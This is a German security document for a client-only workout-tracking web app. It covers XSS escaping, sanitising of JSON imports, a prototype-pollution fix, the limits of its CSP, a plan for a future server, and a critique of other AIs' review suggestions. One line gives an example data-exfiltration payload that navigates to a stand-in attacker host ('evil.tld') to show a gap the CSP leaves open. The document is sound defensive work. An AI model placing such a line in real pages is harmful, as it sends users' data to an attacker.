# TRAIN — SECURITY.md

Stand: train-v180 (2026-07-18). Zwei Teile: (1) was für TRAINs heutige
Architektur bereits gilt, (2) eine Blaupause für den Moment, in dem TRAIN
einen Server bekommt (Paywall/Coaching-Feature, siehe CLAUDE.md).

---

## Teil 1 — Heutige Architektur (reines Client-Side, kein Server)

TRAIN ist eine Vanilla-JS-PWA ohne Build-Step, ohne Backend, ohne Accounts.
Verifiziert (nicht angenommen):

- Kein `fetch()`/API-Aufruf außer dem Service Worker (eigenes Asset-Caching)
  und dem GoatCounter-Zähler-Script (`index.html`, einziger externer Call).
- Kein API-Key/Secret/Passwort im Repo.
- Alle Trainingsdaten liegen ausschließlich in `localStorage` auf dem Gerät
  des jeweiligen Nutzers — kein Cloud-Sync, kein Server, den man betreibt.
- Deployment: statische Dateien auf GitHub Pages.

Damit sind Rate Limiting, Auth/JWT/bcrypt, Access-Control/IDOR,
SQL-Injection, SSRF, WAF/DDoS-Schutz, IP-Bans **nicht anwendbar** — es gibt
keinen Server, gegen den diese Angriffsklassen überhaupt greifen könnten.

**Was heute real ist und laufend beachtet werden muss:**

1. **XSS beim Rendern von Nutzertext.** `ui.js` baut alle Templates per
   Template-Literal + `.innerHTML` (kein Framework mit Auto-Escaping). Jede
   neue Stelle, die `ex.name`/`note`/`title`/`subtitle` (oder künftig neue
   Freitextfelder) in HTML einbettet, **muss** durch `h()` (ui.js:306)
   laufen — Escape-am-Render, nicht am Schreiben. Siehe BUGS.md B59 für den
   einen bisher gefundenen und behobenen Fall (Template-Editor).
2. **JSON-Import (`backup.js`) ist die einzige Stelle, an der fremde Daten
   reinkommen** (geteilte Trainingspläne). `_sanitizeImportedState()`
   (backup.js) normalisiert Textfelder auf String-Typ + Längen-Deckel als
   Defense-in-Depth — ersetzt nicht das Escaping in ui.js, ergänzt es.
   Neue importierbare Freitextfelder müssen dort mit aufgenommen werden.
   Seit train-v180 zusätzlich `_stripPrototypePollutionKeys()`, läuft als
   allererstes über die geparste Datei (vor jeder anderen Prüfung) — siehe
   Punkt 5 unten.
3. **CSP-`<meta>`-Tag** (`index.html`) als zusätzliche Absicherung gegen
   externe Script-Injektion. Nur per `<meta>` möglich (GitHub Pages erlaubt
   keine echten HTTP-Header) — deckt daher nicht alles ab (z.B.
   `X-Frame-Options` braucht einen echten Header). `'unsafe-inline'` bei
   `script-src` ist eine bewusste Kompromisslücke für den bestehenden
   Bootstrap-`<script>` + 4 inline-`onclick`-Handler (kein Nonce/Hash ohne
   Build-Step möglich). Bei einer künftigen Build-Pipeline: diese 4 Handler
   auf das bestehende `data-action`-Event-Delegation-Muster umstellen und
   `'unsafe-inline'` aus `script-src` entfernen. `connect-src`/`img-src`
   sind auf `'self'`+GoatCounter begrenzt — blockiert `fetch()`/`Image()`-
   basierte Datenexfiltration bei einer künftigen XSS-Lücke, **aber nicht**
   Exfiltration per Top-Level-Navigation (`location.href = 'https://evil.tld/?d=...'`)
   — dafür gibt es keinen sauberen CSP-Fix (`navigate-to` hat kaum
   Browser-Support). Unterstreicht, warum das Escaping selbst (Punkt 1) und
   nicht die CSP die eigentliche Verteidigungslinie ist.
4. **Rechtliches:** Impressum/Datenschutzerklärung sind ein aktiver
   Launch-Blocker, siehe LEGAL.md — unabhängig vom technischen Teil dieses
   Dokuments, braucht echte Angaben vom Nutzer.
5. **Prototype Pollution beim JSON-Import (train-v180, Runde-2-Fund).**
   `state.js`s `STATE_IMPORT`-Reducer merged importierte Daten per
   `Object.assign(state, imported)`. Code-verifiziert (nicht nur behauptet):
   ein Top-Level-Feld `"__proto__"` in der importierten JSON ändert darüber
   tatsächlich `state`s Prototype-Chain (`Object.assign` nutzt intern
   `[[Set]]`, das den geerbten `__proto__`-Setter auslöst — `JSON.parse`
   selbst ist davon nicht betroffen, das Risiko entsteht erst beim Merge).
   Kein globales `Object.prototype`-Pollution (das würde alle Objekte
   app-weit betreffen), aber `state` selbst bekäme eine vom Angreifer
   kontrollierte Prototype-Chain — z.B. würde eine `for...in`-Schleife über
   `state` (falls je eingeführt) plötzlich Angreifer-Properties mitzählen.
   Fix: `_stripPrototypePollutionKeys()` (backup.js) entfernt `__proto__`/
   `constructor`/`prototype` rekursiv aus der geparsten Datei, bevor
   irgendetwas anderes sie anfasst. Verifiziert per direktem Test des
   exakten Merge-Musters (`Object.assign` auf ein leeres Ziel-Objekt,
   davor/danach verglichen) — ohne Guard ändert sich die Prototype-Chain
   nachweislich, mit Guard nicht; legitime Importe bleiben byte-identisch.

---

## Teil 2 — Blaupause für den Moment mit Server (Paywall/Coaching)

**Noch nicht gebaut.** Wird relevant, sobald TRAIN eine Paywall/
Coaching-Funktion mit Server + Accounts + Zahlungsabwicklung bekommt
(CLAUDE.md: "Logging kostenlos — Coaching kostenpflichtig"). Dokumentiert
jetzt, damit es beim Bau nicht neu recherchiert werden muss.

- **Auth:** fertigen Anbieter nutzen (Clerk/Firebase/Supabase) statt
  Login/Passwort-Hashing/JWT selbst zu bauen. Falls doch Eigenbau: bcrypt/
  argon2 für Passwörter, JWT in httpOnly-Cookie (nicht localStorage),
  generische Fehlermeldung bei Login-Fehlschlag (nicht verraten ob die
  E-Mail existiert), Sperre nach 5 Fehlversuchen.
- **Access-Control-Matrix:** vor dem Rollen-Design ausfüllen — Tabelle
  Rolle (kostenlos / zahlend / Admin) × Ressource × Aktion × erlaubt/
  verboten. Backend validiert bei JEDER Anfrage: wer fragt, was will er
  tun, an welcher Ressource — nie nur im Frontend prüfen.
- **Rate Limiting:** pro IP + pro Nutzer, alle öffentlichen Endpunkte,
  besonders Login (max. 5 Versuche/15 Min) und die teuerste
  Coaching-Berechnung (verhindert Kostenexplosion durch Wiederholung).
- **API-Key-Handling:** serverseitig/Umgebungsvariablen, nie im Frontend-
  Bundle, Rotation möglich, keine Keys in Logs.
- **Business-Logic-Abuse:** gesamten Nutzerfluss validieren, nicht nur
  einzelne API-Calls (z.B. Bezahlschritt darf nicht überspringbar sein).
- **Sechs-Schichten-Zielbild:** Netzwerk (WAF/CDN/DDoS) → Bot-Abwehr →
  Auth → XSS-Header + serverseitige Validierung → Secrets-Vault +
  Verschlüsselung (nicht nur `.env`) → Monitoring/Observability.
- **PII/Datenschutz:** sobald Nutzerdaten einen Server erreichen —
  Speicherort dokumentieren, Verschlüsselung at rest, Datenschutzerklärung
  entsprechend erweitern (siehe B56).

Kein Umsetzungsplan für heute — aktivieren, wenn die Server-Architektur
ansteht.

---

## Kritische Prüfung von Runde 2 (Claude Cowork + Gemini, 2026-07-18, train-v180)

Zwei weitere KIs haben das fertige Security-Exportdokument gegengelesen.
Jeder Punkt wurde eigenständig verifiziert, nicht übernommen:

**Übernommen:** Prototype Pollution beim JSON-Import (Claude Cowork) —
code-verifiziert am echten `Object.assign(state, imported)`-Muster, siehe
Punkt 5 oben. Echte, präzise lokalisierte Lücke, gefixt.

**Abgelehnt mit technischer Begründung (nicht nur Meinung):**
- **SRI-Hash für das GoatCounter-Script** (Claude Cowork, "kostet nichts,
  Minuten erledigt") — **Einspruch.** GoatCounter liefert `count.js` von
  einer unversionierten URL (`gc.zgo.at/count.js`), der Skriptinhalt kann
  sich beim Anbieter jederzeit ändern. Ein SRI-Hash gegen eine
  unversionierte URL bricht die Analytics beim nächsten Anbieter-Update
  lautlos (Browser verweigert Ausführung bei Hash-Mismatch) — das ist ein
  Wartungs-Trade-off, kein Nulltarif-Fix. Nicht umgesetzt; nur sinnvoll,
  falls GoatCounter eine gepinnte/versionierte Embed-URL anbietet (nicht
  recherchiert).
- **"Zirkuläre JSON-Struktur als Client-DoS"** (Gemini) — **faktisch
  falsch.** JSON-Syntax kennt keine Referenzen; `JSON.parse` kann
  grundsätzlich keine zirkuläre Objektstruktur erzeugen, unabhängig vom
  Payload-Inhalt. Die begleitende "5-MB-Payload verlangsamt das
  Parsen"-Sorge ist real, aber stark übertrieben (Millisekunden-Bereich,
  kein Crash) und durch den bereits bestehenden Dateigrößen-Cap (B59)
  ohnehin entschärft.
- **Client-seitige Verschlüsselung des localStorage** (Gemini, als
  Top-Priorität vorgeschlagen) — **abgelehnt, Security-Theater für dieses
  Bedrohungsmodell.** Ein Schlüssel, der ohne Passphrase im selben
  Browser-Storage/Web-Crypto-Keystore desselben Origins liegt, schützt
  NICHT gegen genau das Szenario, das Gemini selbst als Begründung nennt
  (ein XSS-Angreifer hat denselben Zugriff auf den Schlüssel wie die App
  selbst — kann also identisch entschlüsseln). Zusätzlich neues, größeres
  Risiko eingekauft: Schlüsselverlust = stiller, kompletter Datenverlust,
  ein schlimmeres Fehlerbild als das heutige "Cache-Löschung löscht
  Daten"-Risiko (das ist wenigstens sichtbar/erklärt, siehe
  Datenschutzerklärung).
- **"Silent automated backup in die native Datei-App bei jedem Klick"**
  (Gemini) — **technisch nicht umsetzbar wie beschrieben**, insbesondere
  nicht auf iOS Safari (TRAINs Hauptzielplattform laut CLAUDE.md).
  Browser verweigern lautlose Dateischreibvorgänge ohne Nutzer-Geste
  gezielt (Drive-by-Download-Schutz); die File System Access API, die das
  am ehesten könnte, existiert auf Safari/iOS gar nicht. Der reale, bereits
  vorhandene Baustein dagegen: ein Backup-Erinnerungs-Zähler existiert
  laut Sprint-Historie bereits (4-Wochen-Reminder) — was tatsächlich noch
  fehlt, ist ein Hinweis schon im Onboarding selbst statt nur in den
  Einstellungen (siehe CLAUDE.md-Feature-Backlog).

**Ergänzt (kein Widerspruch, aber Präzisierung):** die Feststellung "kein
Server = IDOR nicht anwendbar" (aus Teil 1 oben) bleibt korrekt für IDOR
spezifisch (per Definition serverseitiges Konzept), wurde aber von Gemini
so gelesen, als würde damit auch XSS-getriebene Datenexfiltration
verneint — das war nie die Aussage (XSS ist explizit als Hauptrisiko in
Punkt 1 benannt). Trotzdem als Anlass genutzt, die CSP-Grenzen präziser
zu dokumentieren (Punkt 3 oben, Top-Level-Navigation als Rest-Lücke).

**GitHub-Account-Härtung (beide KIs, unabhängig bestätigt):** WebAuthn/
Hardware-Key statt SMS/TOTP für 2FA, sicher verwahrte Recovery-Codes.
Reine Account-Einstellung, kein Code — Nutzer-Aktionspunkt, nicht von
Claude Code umsetzbar.
